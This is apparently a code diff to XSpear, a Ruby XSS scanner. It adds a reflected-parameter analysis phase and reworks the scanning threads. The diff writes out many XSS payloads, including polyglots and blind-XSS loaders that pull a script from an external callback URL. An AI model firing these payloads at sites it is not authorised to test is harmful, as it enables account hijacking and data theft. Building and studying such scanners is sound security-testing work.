@@ -28,6 +28,8 @@ class XspearScan
     @blind_url = options['blind']
     @report = XspearRepoter.new @url, Time.now, (@data.nil? ? "GET" : "POST")
     @filtered_objects = {}
+    @reflected_params = []
+    @param_check_switch = 0
   end
 
   class ScanCallbackFunc
@@ -65,8 +67,10 @@ class XspearScan
   class CallbackNotAdded < ScanCallbackFunc
     def run
       if @response.body.include? @query
-        time = Time.now
-        puts '[I]'.blue + " [#{time.strftime('%H:%M:%S')}] [#{@response.code}/#{@response.message}] reflected #{@query}"
+        if (@verbose.to_i > 1)
+          time = Time.now
+          puts '[I]'.blue + " [#{time.strftime('%H:%M:%S')}] [#{@response.code}/#{@response.message}] reflected #{@query}"
+        end
         [false, true]
       else
         [false, "Not reflected #{@query}"]
@@ -421,15 +425,49 @@ class XspearScan
     ]
 
 
-    log('s', 'creating a test query.')
+    ## [ Parameter Analysis ]
+    log('s', 'analysis request..')
     r.push makeQueryPattern('x', '<script>alert(45)</script>', '<script>alert(45)</script>', 'i', "Found WAF", CallbackCheckWAF)
     r.push makeQueryPattern('s', '', '', 'i', "-", CallbackCheckHeaders)
     r.push makeQueryPattern('d', 'XsPeaR"', 'XsPeaR"', 'i', "Found SQL Error Pattern", CallbackErrorPatternMatch)
     r.push makeQueryPattern('r', 'rEfe6', 'rEfe6', 'i', 'reflected parameter', CallbackStringMatch)
+    r = r.flatten
+    r = r.flatten
+
+
+    threads = []
+    r.each_slice(@thread) do |jobs|
+      jobs.map do |node|
+        Thread.new do
+          begin
+            result, req, res = task(node[:query], node[:inject], node[:pattern], node[:callback])
+            # p result.body
+            if @verbose.to_i > 2
+              log('d', "[#{res.code}/#{res.message}] #{node[:query]} in #{node[:inject]}\n[ Request ]\n#{req.to_hash.inspect}\n[ Response ]\n#{res.to_hash.inspect}")
+            end
+            if result[0]
+              log(node[:category], "[#{res.code}/#{res.message}] "+(result[1]).to_s.yellow+"[param: #{node[:param]}][#{node[:desc]}]")
+              @report.add_issue(node[:category],node[:type],node[:param],node[:query],node[:pattern],node[:desc])
+              @reflected_params.push node[:param]
+            elsif (node[:callback] == CallbackNotAdded) && (result[1].to_s == "true")
+              @filtered_objects[node[:param].to_s].nil? ? (@filtered_objects[node[:param].to_s] = [node[:pattern].to_s]) : (@filtered_objects[node[:param].to_s].push(node[:pattern].to_s))
+            elsif node[:type] != "d"
+              log('d', "[#{res.code}/#{res.message}] '#{node[:param]}' "+(result[1]).to_s)
+            end
+          rescue => e
+          end
+        end
+      end.each(&:join)
+    end
+    log('s',"creating a test query [for reflected #{@reflected_params.length} param + blind xss ]")
+    @param_check_switch = false
+    ## [ XSS Scanning ]
+    r = []
     # Check Special Char
     special_chars.each do |sc|
       r.push makeQueryPattern('f', "#{sc}XsPeaR", "#{sc}XsPeaR", 'i', "not filtered "+"#{sc}".blue, CallbackNotAdded)
     end
+
 
     # Check Event Handler
     r.push makeQueryPattern('f', '\"><xspear onhwul=64>', 'onhwul=64', 'i', "not filtered event handler "+"on{any} pattern".blue, CallbackStringMatch)
@@ -437,15 +475,18 @@ class XspearScan
       r.push makeQueryPattern('f', "\"<xspear #{ev}=64>", "#{ev}=64", 'i', "not filtered event handler "+"#{ev}=64".blue, CallbackNotAdded)
     end
 
+
     # Check HTML Tag
     tags.each do |tag|
       r.push makeQueryPattern('f', "\">xsp<#{tag}>", "xsp<#{tag}>", 'i', "not filtered "+"<#{tag}>".blue, CallbackNotAdded)
     end
 
+
     # Check useful code
     useful_code.each do |c|
       r.push makeQueryPattern('f', "#{c}.xspear", "#{c}.xspear", 'i', "not filtered "+"'#{c}' code".blue, CallbackNotAdded)
     end
+
 
     # Check Common XSS Payloads
     onfocus_tags = [
@@ -465,13 +506,15 @@ class XspearScan
     r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '"\'><meter onmouseover=alert(45)>0</meter>', '<meter onmouseover=alert(45)>0</meter>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
 
+
     onfocus_tags.each do |t|
       r.push makeQueryPattern('x', "\"'><#{t} autofocus onfocus=alert(45)>", "<#{t} autofocus onfocus=alert(45)>", 'h', "reflected "+"onfocus XSS Code".red, CallbackStringMatch)
     end
 
+
     # Check Selenium Common XSS Payloads
     r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'v', "triggered ".yellow+"<script>alert(45)</script>".red, CallbackXSSSelenium)
-    r.push makeQueryPattern('x', '"><svgonload=alert(45)>', '<svg(0x0c)onload=alert(1)>', 'v', "triggered ".yellow+"<svg(0x0c)onload=alert(1)>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"><svgonload=alert(45)>', '<svg(0x0c)onload=alert(1)>', 'v', "triggered ".yellow+"<svg(0x0c)onload=alert(1)>".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '<xmp><p title="</xmp><svg/onload=alert(45)>">', '<xmp><p title="</xmp><svg/onload=alert(45)>">', 'v', "triggered ".yellow+"<xmp><p title='</xmp><svg/onload=alert(45)>'>".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '\'"><svg/onload=alert(45)>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"<svg/onload=alert(45)>".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '"\'><video/poster/onerror=alert(45)>', '<video/poster/onerror=alert(45)>', 'h', "triggered ".yellow+"<video/poster/onerror=alert(45)>".red, CallbackXSSSelenium)
@@ -479,48 +522,54 @@ class XspearScan
     r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'h', "triggered ".yellow+"<audio src onloadstart=alert(45)>".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "triggered ".yellow+"<marquee onstart=alert(45)>".red, CallbackXSSSelenium)
 
+
     # Check Selenium XSS Polyglot
     r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
 
 
+
+
     # Check Blind XSS Payload
     if !@blind_url.nil?
-      r.push makeQueryPattern('f', "\"'><script src=#{@blind_url}></script>", "NOTDETECTED", 'i', "", CallbackNotAdded)
-      r.push makeQueryPattern('f', "\"'><script>$.getScript('#{@blind_url}')</script>", "NOTDETECTED", 'i', "", CallbackNotAdded)
-      r.push makeQueryPattern('f', "\"'><svg onload=javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'#{@blind_url}\';d.body.appendChild(_)')>", "NOTDETECTED", 'i', "", CallbackNotAdded)
-      r.push makeQueryPattern('f', "\"'><iframe src=javascript:$.getScript('#{@blind_url}')></iframe>", "NOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><script src=#{@blind_url}></script>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><script>$.getScript('#{@blind_url}')</script>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><svg onload=javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'#{@blind_url}\';d.body.appendChild(_)')>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><iframe src=javascript:$.getScript('#{@blind_url}')></iframe>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
     end
+
 
     r = r.flatten
     r = r.flatten
     log('s', "test query generation is complete. [#{r.length} query]")
-    log('s', "starting test and analysis. [#{@thread} threads]")
+    log('s', "starting XSS Scanning. [#{@thread} threads]")
+
 
     threads = []
     r.each_slice(@thread) do |jobs|
       jobs.map do |node|
         Thread.new do
           begin
-          result, req, res = task(node[:query], node[:inject], node[:pattern], node[:callback])
-          # p result.body
-          if @verbose.to_i > 2
-            log('d', "[#{res.code}/#{res.message}] #{node[:query]} in #{node[:inject]}\n[ Request ]\n#{req.to_hash.inspect}\n[ Response ]\n#{res.to_hash.inspect}")
-          end
-          if result[0]
-            log(node[:category], "[#{res.code}/#{res.message}] "+(result[1]).to_s.yellow+"[param: #{node[:param]}][#{node[:desc]}]")
-            @report.add_issue(node[:category],node[:type],node[:param],node[:query],node[:pattern],node[:desc])
-          elsif (node[:callback] == CallbackNotAdded) && (result[1].to_s == "true")
-            @filtered_objects[node[:param].to_s].nil? ? (@filtered_objects[node[:param].to_s] = [node[:pattern].to_s]) : (@filtered_objects[node[:param].to_s].push(node[:pattern].to_s))
-          else
-            log('d', "[#{res.code}/#{res.message}] '#{node[:param]}' "+(result[1]).to_s)
-          end
+            result, req, res = task(node[:query], node[:inject], node[:pattern], node[:callback])
+            # p result.body
+            if @verbose.to_i > 2
+              log('d', "[#{res.code}/#{res.message}] #{node[:query]} in #{node[:inject]}\n[ Request ]\n#{req.to_hash.inspect}\n[ Response ]\n#{res.to_hash.inspect}")
+            end
+            if result[0]
+              log(node[:category], "[#{res.code}/#{res.message}] "+(result[1]).to_s.yellow+"[param: #{node[:param]}][#{node[:desc]}]")
+              @report.add_issue(node[:category],node[:type],node[:param],node[:query],node[:pattern],node[:desc])
+            elsif (node[:callback] == CallbackNotAdded) && (result[1].to_s == "true")
+              @filtered_objects[node[:param].to_s].nil? ? (@filtered_objects[node[:param].to_s] = [node[:pattern].to_s]) : (@filtered_objects[node[:param].to_s].push(node[:pattern].to_s))
+            elsif node[:type] != "f"
+              log('d', "[#{res.code}/#{res.message}] '#{node[:param]}' "+(result[1]).to_s)
+            end
           rescue => e
           end
         end
       end.each(&:join)
     end
+
 
     @report.set_filtered @filtered_objects
     @report.set_endtime
@@ -555,19 +604,7 @@ class XspearScan
       begin
         params = URI.decode_www_form(uri.query)
         params.each do |p|
-          if @params.nil? || (@params.include? p[0] if !@params.nil?)
-            attack = ""
-            dparams = params
-            dparams.each do |d|
-              attack = uri.query.sub "#{d[0]}=#{d[1]}","#{d[0]}=#{d[1]}#{URI::encode(payload)}" if p[0] == d[0]
-              #d[1] = p[1] + payload if p[0] == d[0]
-            end
-            result.push("inject": 'url',"param":p[0] ,"type": type, "query": attack, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
-          end
-        end
-        unless @data.nil?
-          params = URI.decode_www_form(@data)
-          params.each do |p|
+          if  (@param_check_switch) || (@reflected_params.include? p[0]) || pattern == "BLINDNOTDETECTED"
             if @params.nil? || (@params.include? p[0] if !@params.nil?)
               attack = ""
               dparams = params
@@ -575,7 +612,23 @@ class XspearScan
                 attack = uri.query.sub "#{d[0]}=#{d[1]}","#{d[0]}=#{d[1]}#{URI::encode(payload)}" if p[0] == d[0]
                 #d[1] = p[1] + payload if p[0] == d[0]
               end
-              result.push("inject": 'body', "param":p[0], "type": type, "query": attack, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
+              result.push("inject": 'url',"param":p[0] ,"type": type, "query": attack, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
+            end
+          end
+        end
+        unless @data.nil?
+          params = URI.decode_www_form(@data)
+          params.each do |p|
+            if !@param_check_switch || (@reflected_params.include? p)
+              if @params.nil? || (@params.include? p[0] if !@params.nil?)
+                attack = ""
+                dparams = params
+                dparams.each do |d|
+                  attack = uri.query.sub "#{d[0]}=#{d[1]}","#{d[0]}=#{d[1]}#{URI::encode(payload)}" if p[0] == d[0]
+                  #d[1] = p[1] + payload if p[0] == d[0]
+                end
+                result.push("inject": 'body', "param":p[0], "type": type, "query": attack, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
+              end
             end
           end
         end
@@ -585,7 +638,6 @@ class XspearScan
       result
     end
   end
-
 
   def task(query, injected, pattern, callback)
     begin
